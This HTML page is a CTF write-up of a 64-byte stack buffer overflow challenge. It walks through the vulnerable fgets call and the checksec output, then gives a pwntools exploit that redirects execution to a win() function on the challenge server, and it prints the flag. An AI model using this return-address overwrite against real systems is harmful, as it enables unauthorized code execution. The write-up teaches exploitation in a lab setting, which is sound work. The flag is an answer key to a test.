F<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit 100-4: The Floor is Lava - Writeup</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <script>
        tailwind.config = { darkMode: 'class', theme: { extend: { fontFamily: { 'sans': ['Inter', 'sans-serif'], 'mono': ['JetBrains Mono', 'monospace'] }}}}
    </script>
</head>
<body class="bg-black text-slate-300 font-sans antialiased">
    <div class="max-w-4xl mx-auto px-6 py-12">
        <a href="../ctf-new.html" class="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 mb-8">
            <i class="ph-bold ph-arrow-left"></i>
            Back to CTF Writeups
        </a>

        <header class="mb-12">
            <div class="flex items-center gap-3 mb-4">
                <span class="px-3 py-1 bg-red-500/10 text-red-400 border border-red-500/30 rounded-lg text-sm font-semibold uppercase">Binary Exploitation</span>
                <span class="text-2xl font-bold text-red-400">100 points</span>
            </div>
            <h1 class="text-4xl font-bold text-white mb-4">The Floor is Lava</h1>
            <div class="flex items-center gap-6 text-sm text-slate-400">
                <span class="flex items-center gap-2"><i class="ph-bold ph-calendar"></i> November 10, 2025</span>
                <span class="flex items-center gap-2"><i class="ph-bold ph-flag"></i> PointerOverflow CTF 2025</span>
            </div>
        </header>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Challenge Description</h2>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <p class="text-slate-300 leading-relaxed mb-4">
                    The quintessential Aleph One style stack smash! A classic buffer overflow challenge with a <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">win()</code> function at <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">0x4010f0</code>.
                </p>
                <p class="text-slate-400 text-sm">
                    Target: <code class="bg-slate-800 px-2 py-1 rounded">exp100-4.pointeroverflowctf.com:14668</code>
                </p>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Vulnerability Analysis</h2>
            
            <h3 class="text-xl font-semibold text-white mb-3">Source Code Review</h3>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-6">
                <pre class="text-sm text-slate-300 font-mono overflow-x-auto"><code>char buf[64];
if(!fgets(buf, 512, stdin)) return 0;   // Buffer overflow!</code></pre>
            </div>
            <p class="text-slate-300 mb-6">
                The vulnerability is obvious: <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">buf</code> is only 64 bytes, but <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">fgets</code> reads up to 512 bytes!
            </p>

            <h3 class="text-xl font-semibold text-white mb-3">Binary Protections</h3>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-6">
                <pre class="text-sm text-slate-300 font-mono overflow-x-auto"><code>$ checksec exp100-4
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown
    PIE:      No PIE (0x400000)</code></pre>
            </div>
            <ul class="space-y-2 text-slate-300 mb-6">
                <li class="flex items-start gap-3">
                    <i class="ph-bold ph-x-circle text-red-400 mt-1"></i>
                    <span><strong>No stack canary</strong> - Stack overflow is possible</span>
                </li>
                <li class="flex items-start gap-3">
                    <i class="ph-bold ph-x-circle text-red-400 mt-1"></i>
                    <span><strong>No PIE</strong> - Addresses are fixed and predictable</span>
                </li>
            </ul>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Exploitation</h2>
            
            <h3 class="text-xl font-semibold text-white mb-3">Strategy</h3>
            <ol class="space-y-3 text-slate-300 mb-6 list-decimal list-inside">
                <li>Overflow the 64-byte buffer</li>
                <li>Overwrite saved RBP (8 bytes)</li>
                <li>Overwrite return address with address of <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">win()</code></li>
                <li>Add a <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">ret</code> gadget for stack alignment (modern systems requirement)</li>
            </ol>

            <h3 class="text-xl font-semibold text-white mb-3">Exploit Code</h3>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 mb-6">
                <pre class="text-sm text-slate-300 font-mono overflow-x-auto"><code>#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Load binary and find addresses
elf = ELF('./exp100-4')
win_addr = elf.symbols['win']
ret_gadget = next(elf.search(asm('ret')))

print(f"[+] win() @ {hex(win_addr)}")
print(f"[+] ret gadget @ {hex(ret_gadget)}")

# Connect to remote
io = remote('exp100-4.pointeroverflowctf.com', 14668)
io.recvuntil(b'> ')

# Build payload
offset = 64 + 8  # buf + saved RBP

payload = b'A' * offset
payload += p64(ret_gadget)  # Stack alignment
payload += p64(win_addr)    # Call win()

print(f"[+] Sending payload")
io.send(payload + b'\n')

# Get flag
response = io.recvall(timeout=3).decode('utf-8', errors='ignore')
print(response)

io.close()</code></pre>
            </div>

            <h3 class="text-xl font-semibold text-white mb-3">Why Stack Alignment?</h3>
            <p class="text-slate-300 mb-4">
                Modern x86-64 systems require the stack to be 16-byte aligned before calling functions. 
                Adding a <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">ret</code> gadget ensures proper alignment and prevents crashes in <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">win()</code>.
            </p>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Flag</h2>
            <div class="bg-gradient-to-r from-green-900/50 to-emerald-900/50 border border-green-500/30 rounded-lg p-6">
                <div class="flex items-center gap-3">
                    <i class="ph-bold ph-check-circle text-3xl text-green-400"></i>
                    <code class="text-xl font-mono text-green-400">poctf{uwsp_17_w45n7_3v3n_w0r7h_17}</code>
                </div>
            </div>
        </section>

        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">Key Takeaways</h2>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <ul class="space-y-3 text-slate-300">
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-check text-blue-400 mt-1"></i>
                        <span>Classic buffer overflow: overwrite return address to redirect execution</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-check text-blue-400 mt-1"></i>
                        <span>Stack alignment is crucial on modern x86-64 systems</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-check text-blue-400 mt-1"></i>
                        <span>No PIE makes exploitation straightforward with fixed addresses</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-check text-blue-400 mt-1"></i>
                        <span>Always check binary protections with <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">checksec</code></span>
                    </li>
                </ul>
            </div>
        </section>

        
    </div>
</body>
</html>
F*cascade08"(2d98567da85669db64b0fe8d9af9d94466e9642c27file:///home/elw00/ctf-site/writeups/exploit-100-4.html:file:///home/elw00/ctf-site